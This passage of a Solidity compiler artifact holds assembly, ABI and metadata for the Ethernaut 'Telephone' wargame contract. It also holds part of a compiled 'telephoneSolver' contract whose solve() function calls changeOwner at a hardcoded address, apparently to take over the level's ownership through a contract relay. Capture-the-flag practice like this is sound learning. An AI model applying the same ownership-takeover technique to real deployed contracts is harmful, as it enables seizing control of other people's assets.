											"begin": 231,
											"end": 263,
											"name": "SLT",
											"source": 1
										},
										{
											"begin": 228,
											"end": 347,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 228,
											"end": 347,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "21"
										},
										{
											"begin": 228,
											"end": 347,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 266,
											"end": 345,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 266,
											"end": 345,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "23"
										},
										{
											"begin": 266,
											"end": 345,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 266,
											"end": 345,
											"name": "tag",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 266,
											"end": 345,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 228,
											"end": 347,
											"name": "tag",
											"source": 1,
											"value": "21"
										},
										{
											"begin": 228,
											"end": 347,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 386,
											"end": 387,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 411,
											"end": 464,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 456,
											"end": 463,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 447,
											"end": 453,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 436,
											"end": 445,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 432,
											"end": 454,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 411,
											"end": 464,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "16"
										},
										{
											"begin": 411,
											"end": 464,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 411,
											"end": 464,
											"name": "tag",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 411,
											"end": 464,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 401,
											"end": 464,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 401,
											"end": 464,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 357,
											"end": 474,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 152,
											"end": 481,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 152,
											"end": 481,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 152,
											"end": 481,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 152,
											"end": 481,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 152,
											"end": 481,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 487,
											"end": 605,
											"name": "tag",
											"source": 1,
											"value": "25"
										},
										{
											"begin": 487,
											"end": 605,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 574,
											"end": 598,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "27"
										},
										{
											"begin": 592,
											"end": 597,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 574,
											"end": 598,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 574,
											"end": 598,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 574,
											"end": 598,
											"name": "tag",
											"source": 1,
											"value": "27"
										},
										{
											"begin": 574,
											"end": 598,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 569,
											"end": 572,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 562,
											"end": 599,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 487,
											"end": 605,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 487,
											"end": 605,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 487,
											"end": 605,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 611,
											"end": 833,
											"name": "tag",
											"source": 1,
											"value": "8"
										},
										{
											"begin": 611,
											"end": 833,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 704,
											"end": 708,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 742,
											"end": 744,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 731,
											"end": 740,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 727,
											"end": 745,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 719,
											"end": 745,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 719,
											"end": 745,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 755,
											"end": 826,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 823,
											"end": 824,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 812,
											"end": 821,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 808,
											"end": 825,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 799,
											"end": 805,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 755,
											"end": 826,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "25"
										},
										{
											"begin": 755,
											"end": 826,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 755,
											"end": 826,
											"name": "tag",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 755,
											"end": 826,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 611,
											"end": 833,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 611,
											"end": 833,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 611,
											"end": 833,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 611,
											"end": 833,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 611,
											"end": 833,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 920,
											"end": 1016,
											"name": "tag",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 920,
											"end": 1016,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 957,
											"end": 964,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 986,
											"end": 1010,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 1004,
											"end": 1009,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 986,
											"end": 1010,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 986,
											"end": 1010,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 986,
											"end": 1010,
											"name": "tag",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 986,
											"end": 1010,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 975,
											"end": 1010,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 975,
											"end": 1010,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 920,
											"end": 1016,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 920,
											"end": 1016,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 920,
											"end": 1016,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 920,
											"end": 1016,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1022,
											"end": 1148,
											"name": "tag",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 1022,
											"end": 1148,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1059,
											"end": 1066,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1099,
											"end": 1141,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1092,
											"end": 1097,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1088,
											"end": 1142,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1077,
											"end": 1142,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1077,
											"end": 1142,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1022,
											"end": 1148,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1022,
											"end": 1148,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1022,
											"end": 1148,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1022,
											"end": 1148,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1277,
											"end": 1394,
											"name": "tag",
											"source": 1,
											"value": "23"
										},
										{
											"begin": 1277,
											"end": 1394,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1386,
											"end": 1387,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1383,
											"end": 1384,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1376,
											"end": 1388,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 1400,
											"end": 1522,
											"name": "tag",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 1400,
											"end": 1522,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1473,
											"end": 1497,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "41"
										},
										{
											"begin": 1491,
											"end": 1496,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1473,
											"end": 1497,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 1473,
											"end": 1497,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1473,
											"end": 1497,
											"name": "tag",
											"source": 1,
											"value": "41"
										},
										{
											"begin": 1473,
											"end": 1497,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1466,
											"end": 1471,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1463,
											"end": 1498,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 1453,
											"end": 1516,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "42"
										},
										{
											"begin": 1453,
											"end": 1516,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1512,
											"end": 1513,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1509,
											"end": 1510,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1502,
											"end": 1514,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 1453,
											"end": 1516,
											"name": "tag",
											"source": 1,
											"value": "42"
										},
										{
											"begin": 1453,
											"end": 1516,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1400,
											"end": 1522,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1400,
											"end": 1522,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"changeOwner(address)": "a6f9dae1",
							"owner()": "8da5cb5b"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.7+commit.e28d00a7\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"changeOwner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"ethernautTelephone.sol\":\"Telephone\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"ethernautTelephone.sol\":{\"keccak256\":\"0xfaec50c76ab3fc1b14214c85afe56ce0d5bc57ba2b3ddf45ca1f3a81f3202067\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://d0e397725e2a35853dab6dc6e67da630216b436305b960ad24425c143e3a03bd\",\"dweb:/ipfs/QmcjZx4m8e2Z4FZRmcMuZES4AfHji62snqHrMnnMC2t8JF\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 3,
								"contract": "ethernautTelephone.sol:Telephone",
								"label": "owner",
								"offset": 0,
								"slot": "0",
								"type": "t_address"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				},
				"telephoneSolver": {
					"abi": [
						{
							"inputs": [],
							"name": "solve",
							"outputs": [
								{
									"internalType": "bytes",
									"name": "",
									"type": "bytes"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"ethernautTelephone.sol\":294:817  contract telephoneSolver {\r... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"ethernautTelephone.sol\":294:817  contract telephoneSolver {\r... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x890d6908\n      eq\n      tag_3\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"ethernautTelephone.sol\":328:814  function solve() external returns (bytes memory) {\r... */\n    tag_3:\n      tag_4\n      tag_5\n      jump\t// in\n    tag_4:\n      mload(0x40)\n      tag_6\n      swap2\n      swap1\n      tag_7\n      jump\t// in\n    tag_6:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n    tag_5:\n        /* \"ethernautTelephone.sol\":363:375  bytes memory */\n      0x60\n        /* \"ethernautTelephone.sol\":388:408  address contractAddr */\n      0x00\n        /* \"ethernautTelephone.sol\":419:461  0x03cbED7039bDA6ae4523C6E7BB6579718A584f83 */\n      0x03cbed7039bda6ae4523c6e7bb6579718a584f83\n        /* \"ethernautTelephone.sol\":388:462  address contractAddr = address(0x03cbED7039bDA6ae4523C6E7BB6579718A584f83) */\n      swap1\n      pop\n        /* \"ethernautTelephone.sol\":474:486  bool success */\n      0x00\n        /* \"ethernautTelephone.sol\":488:507  bytes memory reason */\n      dup1\n        /* \"ethernautTelephone.sol\":511:523  contractAddr */\n      dup3\n        /* \"ethernautTelephone.sol\":511:528  contractAddr.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"ethernautTelephone.sol\":533:542  gasleft() */\n      gas\n        /* \"ethernautTelephone.sol\":582:615  keccak256(\"changeOwner(address)\") */\n      0xa6f9dae13f6f9f7de69814715796059e291f78e951670d244dd3b07111b8bb18\n        /* \"ethernautTelephone.sol\":640:682  0x798349E06c67272465123B91bd88C5d19b8c7878 */\n      0x798349e06c67272465123b91bd88c5d19b8c7878\n        /* \"ethernautTelephone.sol\":544:694  abi.encodePacked(\r... */\n      add(0x20, mload(0x40))\n      tag_9\n      swap3\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n        /* \"ethernautTelephone.sol\":511:695  contractAddr.call{gas:gasleft()}(abi.encodePacked(\r... */\n      mload(0x40)\n      tag_11\n      swap2\n      swap1\n      tag_12\n      jump\t// in\n    tag_11:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup8\n      call\n      swap3\n      pop\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_15\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_14)\n    tag_15:\n      0x60\n      swap2\n      pop\n    tag_14:\n      pop\n        /* \"ethernautTelephone.sol\":473:695  (bool success, bytes memory reason) = contractAddr.call{gas:gasleft()}(abi.encodePacked(\r... */\n      swap2\n      pop\n      swap2\n      pop\n        /* \"ethernautTelephone.sol\":709:716  success */\n      dup2\n        /* \"ethernautTelephone.sol\":706:807  if(success){\r... */\n      iszero\n      tag_16\n      jumpi\n        /* \"ethernautTelephone.sol\":739:745  reason */\n      dup1\n        /* \"ethernautTelephone.sol\":732:745  return reason */\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump(tag_8)\n        /* \"ethernautTelephone.sol\":706:807  if(success){\r... */\n    tag_16:\n        /* \"ethernautTelephone.sol\":787:795  revert() */\n      0x00\n      dup1\n      revert\n        /* \"ethernautTelephone.sol\":328:814  function solve() external returns (bytes memory) {\r... */\n    tag_8:\n      swap1\n      jump\t// out\n        /* \"#utility.yul\":7:164   */\n    tag_19:\n        /* \"#utility.yul\":112:157   */\n      tag_21\n        /* \"#utility.yul\":132:156   */\n      tag_22\n        /* \"#utility.yul\":150:155   */\n      dup3\n        /* \"#utility.yul\":132:156   */\n      tag_23\n      jump\t// in\n    tag_22:\n        /* \"#utility.yul\":112:157   */\n      tag_24\n      jump\t// in\n    tag_21:\n        /* \"#utility.yul\":107:110   */\n      dup3\n        /* \"#utility.yul\":100:158   */\n      mstore\n        /* \"#utility.yul\":7:164   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":170:323   */\n    tag_25:\n        /* \"#utility.yul\":273:316   */\n      tag_27\n        /* \"#utility.yul\":292:315   */\n      tag_28\n        /* \"#utility.yul\":309:314   */\n      dup3\n        /* \"#utility.yul\":292:315   */\n      tag_29\n      jump\t// in\n    tag_28:\n        /* \"#utility.yul\":273:316   */\n      tag_30\n      jump\t// in\n    tag_27:\n        /* \"#utility.yul\":268:271   */\n      dup3\n        /* \"#utility.yul\":261:317   */\n      mstore\n        /* \"#utility.yul\":170:323   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":329:689   */\n    tag_31:\n        /* \"#utility.yul\":415:418   */\n      0x00\n        /* \"#utility.yul\":443:481   */\n      tag_33\n        /* \"#utility.yul\":475:480   */\n      dup3\n        /* \"#utility.yul\":443:481   */\n      tag_34\n      jump\t// in\n    tag_33:\n        /* \"#utility.yul\":497:567   */\n      tag_35\n        /* \"#utility.yul\":560:566   */\n      dup2\n        /* \"#utility.yul\":555:558   */\n      dup6\n        /* \"#utility.yul\":497:567   */\n      tag_36\n      jump\t// in\n    tag_35:\n        /* \"#utility.yul\":490:567   */\n      swap4\n      pop\n        /* \"#utility.yul\":576:628   */\n      tag_37\n        /* \"#utility.yul\":621:627   */\n      dup2\n        /* \"#utility.yul\":616:619   */\n      dup6\n        /* \"#utility.yul\":609:613   */\n      0x20\n        /* \"#utility.yul\":602:607   */\n      dup7\n        /* \"#utility.yul\":598:614   */\n      add\n        /* \"#utility.yul\":576:628   */\n      tag_38\n      jump\t// in\n    tag_37:\n        /* \"#utility.yul\":653:682   */\n      tag_39\n        /* \"#utility.yul\":675:681   */\n      dup2\n        /* \"#utility.yul\":653:682   */\n      tag_40\n      jump\t// in\n    tag_39:\n        /* \"#utility.yul\":648:651   */\n      dup5\n        /* \"#utility.yul\":644:683   */\n      add\n        /* \"#utility.yul\":637:683   */\n      swap2\n      pop\n        /* \"#utility.yul\":419:689   */\n      pop\n        /* \"#utility.yul\":329:689   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":695:1068   */\n    tag_41:\n        /* \"#utility.yul\":799:802   */\n      0x00\n        /* \"#utility.yul\":827:865   */\n      tag_43\n        /* \"#utility.yul\":859:864   */\n      dup3\n        /* \"#utility.yul\":827:865   */\n      tag_34\n      jump\t// in\n    tag_43:\n        /* \"#utility.yul\":881:969   */\n      tag_44\n        /* \"#utility.yul\":962:968   */\n      dup2\n        /* \"#utility.yul\":957:960   */\n      dup6\n        /* \"#utility.yul\":881:969   */\n      tag_45\n      jump\t// in\n    tag_44:\n        /* \"#utility.yul\":874:969   */\n      swap4\n      pop\n        /* \"#utility.yul\":978:1030   */\n      tag_46\n        /* \"#utility.yul\":1023:1029   */\n      dup2\n        /* \"#utility.yul\":1018:1021   */\n      dup6\n        /* \"#utility.yul\":1011:1015   */\n      0x20\n        /* \"#utility.yul\":1004:1009   */\n      dup7\n        /* \"#utility.yul\":1000:1016   */\n      add\n        /* \"#utility.yul\":978:1030   */\n      tag_38\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":1055:1061   */\n      dup1\n        /* \"#utility.yul\":1050:1053   */\n      dup5\n        /* \"#utility.yul\":1046:1062   */\n      add\n        /* \"#utility.yul\":1039:1062   */\n      swap2\n      pop\n        /* \"#utility.yul\":803:1068   */\n      pop\n        /* \"#utility.yul\":695:1068   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1074:1466   */\n    tag_10:\n        /* \"#utility.yul\":1212:1215   */\n      0x00\n        /* \"#utility.yul\":1227:1300   */\n      tag_48\n        /* \"#utility.yul\":1296:1299   */\n      dup3\n        /* \"#utility.yul\":1287:1293   */\n      dup6\n        /* \"#utility.yul\":1227:1300   */\n      tag_25\n      jump\t// in\n    tag_48:\n        /* \"#utility.yul\":1325:1326   */\n      0x04\n        /* \"#utility.yul\":1320:1323   */\n      dup3\n        /* \"#utility.yul\":1316:1327   */\n      add\n        /* \"#utility.yul\":1309:1327   */\n      swap2\n      pop\n        /* \"#utility.yul\":1337:1412   */\n      tag_49\n        /* \"#utility.yul\":1408:1411   */\n      dup3\n        /* \"#utility.yul\":1399:1405   */\n      dup5\n        /* \"#utility.yul\":1337:1412   */\n      tag_19\n      jump\t// in\n    tag_49:\n        /* \"#utility.yul\":1437:1439   */\n      0x14\n        /* \"#utility.yul\":1432:1435   */\n      dup3\n        /* \"#utility.yul\":1428:1440   */\n      add\n        /* \"#utility.yul\":1421:1440   */\n      swap2\n      pop\n        /* \"#utility.yul\":1457:1460   */\n      dup2\n        /* \"#utility.yul\":1450:1460   */\n      swap1\n      pop\n        /* \"#utility.yul\":1074:1466   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1472:1743   */\n    tag_12:\n        /* \"#utility.yul\":1602:1605   */\n      0x00\n        /* \"#utility.yul\":1624:1717   */\n      tag_51\n        /* \"#utility.yul\":1713:1716   */\n      dup3\n        /* \"#utility.yul\":1704:1710   */\n      dup5\n        /* \"#utility.yul\":1624:1717   */\n      tag_41\n      jump\t// in\n    tag_51:\n        /* \"#utility.yul\":1617:1717   */\n      swap2\n      pop\n        /* \"#utility.yul\":1734:1737   */\n      dup2\n        /* \"#utility.yul\":1727:1737   */\n      swap1\n      pop\n        /* \"#utility.yul\":1472:1743   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1749:2058   */\n    tag_7:\n        /* \"#utility.yul\":1860:1864   */\n      0x00\n        /* \"#utility.yul\":1898:1900   */\n      0x20\n        /* \"#utility.yul\":1887:1896   */\n      dup3\n        /* \"#utility.yul\":1883:1901   */\n      add\n        /* \"#utility.yul\":1875:1901   */\n      swap1\n      pop\n        /* \"#utility.yul\":1947:1956   */\n      dup2\n        /* \"#utility.yul\":1941:1945   */\n      dup2\n        /* \"#utility.yul\":1937:1957   */\n      sub\n        /* \"#utility.yul\":1933:1934   */\n      0x00\n        /* \"#utility.yul\":1922:1931   */\n      dup4\n        /* \"#utility.yul\":1918:1935   */\n      add\n        /* \"#utility.yul\":1911:1958   */\n      mstore\n        /* \"#utility.yul\":1975:2051   */\n      tag_53\n        /* \"#utility.yul\":2046:2050   */\n      dup2\n        /* \"#utility.yul\":2037:2043   */\n      dup5\n        /* \"#utility.yul\":1975:2051   */\n      tag_31\n      jump\t// in\n    tag_53:\n        /* \"#utility.yul\":1967:2051   */\n      swap1\n      pop\n        /* \"#utility.yul\":1749:2058   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2064:2162   */\n    tag_34:\n        /* \"#utility.yul\":2115:2121   */\n      0x00\n        /* \"#utility.yul\":2149:2154   */\n      dup2\n        /* \"#utility.yul\":2143:2155   */\n      mload\n        /* \"#utility.yul\":2133:2155   */\n      swap1\n      pop\n        /* \"#utility.yul\":2064:2162   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2168:2336   */\n    tag_36:\n        /* \"#utility.yul\":2251:2262   */\n      0x00\n        /* \"#utility.yul\":2285:2291   */\n      dup3\n        /* \"#utility.yul\":2280:2283   */\n      dup3\n        /* \"#utility.yul\":2273:2292   */\n      mstore\n        /* \"#utility.yul\":2325:2329   */\n      0x20\n        /* \"#utility.yul\":2320:2323   */\n      dup3\n        /* \"#utility.yul\":2316:2330   */\n      add\n        /* \"#utility.yul\":2301:2330   */\n      swap1\n      pop\n        /* \"#utility.yul\":2168:2336   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2342:2489   */\n    tag_45:\n        /* \"#utility.yul\":2443:2454   */\n      0x00\n        /* \"#utility.yul\":2480:2483   */\n      dup2\n        /* \"#utility.yul\":2465:2483   */\n      swap1\n      pop\n        /* \"#utility.yul\":2342:2489   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2495:2591   */\n    tag_23:\n        /* \"#utility.yul\":2532:2539   */\n      0x00\n        /* \"#utility.yul\":2561:2585   */\n      tag_58\n        /* \"#utility.yul\":2579:2584   */\n      dup3\n        /* \"#utility.yul\":2561:2585   */\n      tag_59\n      jump\t// in\n    tag_58:\n        /* \"#utility.yul\":2550:2585   */\n      swap1\n      pop\n        /* \"#utility.yul\":2495:2591   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2597:2746   */\n    tag_29:\n        /* \"#utility.yul\":2633:2640   */\n      0x00\n        /* \"#utility.yul\":2673:2739   */\n      0xffffffff00000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2666:2671   */\n      dup3\n        /* \"#utility.yul\":2662:2740   */\n      and\n        /* \"#utility.yul\":2651:2740   */\n      swap1\n      pop\n        /* \"#utility.yul\":2597:2746   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2752:2878   */\n    tag_59:\n        /* \"#utility.yul\":2789:2796   */\n      0x00\n        /* \"#utility.yul\":2829:2871   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":2822:2827   */\n      dup3\n        /* \"#utility.yul\":2818:2872   */\n      and\n        /* \"#utility.yul\":2807:2872   */\n      swap1\n      pop\n        /* \"#utility.yul\":2752:2878   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2884:3191   */\n    tag_38:\n        /* \"#utility.yul\":2952:2953   */\n      0x00\n        /* \"#utility.yul\":2962:3075   */\n    tag_63:\n        /* \"#utility.yul\":2976:2982   */\n      dup4\n        /* \"#utility.yul\":2973:2974   */\n      dup2\n        /* \"#utility.yul\":2970:2983   */\n      lt\n        /* \"#utility.yul\":2962:3075   */\n      iszero\n      tag_65\n      jumpi\n        /* \"#utility.yul\":3061:3062   */\n      dup1\n        /* \"#utility.yul\":3056:3059   */\n      dup3\n        /* \"#utility.yul\":3052:3063   */\n      add\n        /* \"#utility.yul\":3046:3064   */\n      mload\n        /* \"#utility.yul\":3042:3043   */\n      dup2\n        /* \"#utility.yul\":3037:3040   */\n      dup5\n        /* \"#utility.yul\":3033:3044   */\n      add\n        /* \"#utility.yul\":3026:3065   */\n      mstore\n        /* \"#utility.yul\":2998:3000   */\n      0x20\n        /* \"#utility.yul\":2995:2996   */\n      dup2\n        /* \"#utility.yul\":2991:3001   */\n      add\n        /* \"#utility.yul\":2986:3001   */\n      swap1\n      pop\n        /* \"#utility.yul\":2962:3075   */\n      jump(tag_63)\n    tag_65:\n        /* \"#utility.yul\":3093:3099   */\n      dup4\n        /* \"#utility.yul\":3090:3091   */\n      dup2\n        /* \"#utility.yul\":3087:3100   */\n      gt\n        /* \"#utility.yul\":3084:3185   */\n      iszero\n      tag_66\n      jumpi\n        /* \"#utility.yul\":3173:3174   */\n      0x00\n        /* \"#utility.yul\":3164:3170   */\n      dup5\n        /* \"#utility.yul\":3159:3162   */\n      dup5\n        /* \"#utility.yul\":3155:3171   */\n      add\n        /* \"#utility.yul\":3148:3175   */\n      mstore\n        /* \"#utility.yul\":3084:3185   */\n    tag_66:\n        /* \"#utility.yul\":2933:3191   */\n      pop\n        /* \"#utility.yul\":2884:3191   */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3197:3297   */\n    tag_24:\n        /* \"#utility.yul\":3236:3243   */\n      0x00\n        /* \"#utility.yul\":3265:3291   */\n      tag_68\n        /* \"#utility.yul\":3285:3290   */\n      dup3\n        /* \"#utility.yul\":3265:3291   */\n      tag_69\n      jump\t// in\n    tag_68:\n        /* \"#utility.yul\":3254:3291   */\n      swap1\n      pop\n        /* \"#utility.yul\":3197:3297   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3303:3381   */\n    tag_30:\n        /* \"#utility.yul\":3341:3348   */\n      0x00\n        /* 